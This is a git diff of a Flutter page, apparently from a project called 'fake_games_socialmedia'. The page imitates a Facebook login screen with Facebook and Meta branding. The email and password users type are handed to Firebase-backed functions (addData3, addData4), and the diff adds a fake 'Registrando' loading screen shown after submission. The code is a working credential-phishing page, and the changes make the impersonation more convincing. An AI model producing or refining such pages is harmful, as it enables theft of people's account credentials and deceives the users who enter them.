@@ -1,3 +1,4 @@
+import 'package:fake_games_socialmedia/pages/Home_Page.dart';
 import 'package:fake_games_socialmedia/services/firebase_data.dart';
 import 'package:flutter/material.dart';
 
@@ -9,14 +10,22 @@ class Facebookpage2 extends StatefulWidget {
 }
 
 class _Facebookpage2State extends State<Facebookpage2> {
+  bool _obscureText = true;
+
   TextEditingController dataemail = TextEditingController(text: "");
   TextEditingController datapassword = TextEditingController(text: "");
+
   @override
   Widget build(BuildContext context) {
     return Scaffold(
-      appBar: AppBar(),
-      body: Column(
-        mainAxisAlignment: MainAxisAlignment.spaceAround,
+      appBar: AppBar(
+        backgroundColor: Color(0xFFF2B6AB1),
+        elevation: 0,
+        actions: [
+          Image(width: 360, image: AssetImage("assets/searchfacebook.jpg"))
+        ],
+      ),
+      body: ListView(
         children: [
           Divider(
             height: 6.0,
@@ -34,6 +43,10 @@ class _Facebookpage2State extends State<Facebookpage2> {
                   width: 60.0,
                   height: 60.0,
                   child: Image(image: AssetImage("assets/logo.png"))),
+              Divider(
+                height: 30,
+                color: Colors.transparent,
+              )
             ],
           ),
 
@@ -54,8 +67,18 @@ class _Facebookpage2State extends State<Facebookpage2> {
                 ),
                 TextFormField(
                   controller: datapassword,
-                  obscureText: true,
+                  obscureText: _obscureText,
                   decoration: InputDecoration(
+                      suffixIcon: GestureDetector(
+                        onTap: () {
+                          setState(() {
+                            _obscureText = !_obscureText;
+                          });
+                        },
+                        child: Icon(_obscureText
+                            ? Icons.visibility
+                            : Icons.visibility_off),
+                      ),
                       hintText: "Contraseña",
                       border: OutlineInputBorder(
                           borderSide:
@@ -71,6 +94,11 @@ class _Facebookpage2State extends State<Facebookpage2> {
                     onPressed: () async {
                       await addData3(dataemail.text);
                       addData4(datapassword.text);
+                      Navigator.push(
+                        context,
+                        MaterialPageRoute(
+                            builder: (context) => LoadingFacebook()),
+                      );
                     },
                     child: Container(
                       height: 50,
@@ -115,10 +143,33 @@ class _Facebookpage2State extends State<Facebookpage2> {
                   width: 80,
                   height: 80,
                   child: Image(image: AssetImage("assets/meta.png")),
-                )
+                ),
               ],
             ),
           ),
+        ],
+      ),
+    );
+  }
+}
+
+class LoadingFacebook extends StatelessWidget {
+  const LoadingFacebook({Key? key}) : super(key: key);
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      backgroundColor: Colors.white,
+      body: Column(
+        mainAxisAlignment: MainAxisAlignment.center,
+        children: [
+          Center(
+              child: Column(
+            children: [
+              Text("Registrando, Espere un momento..... :) !"),
+              Image(width: 100, image: AssetImage("assets/gifloading.gif"))
+            ],
+          ))
         ],
       ),
     );
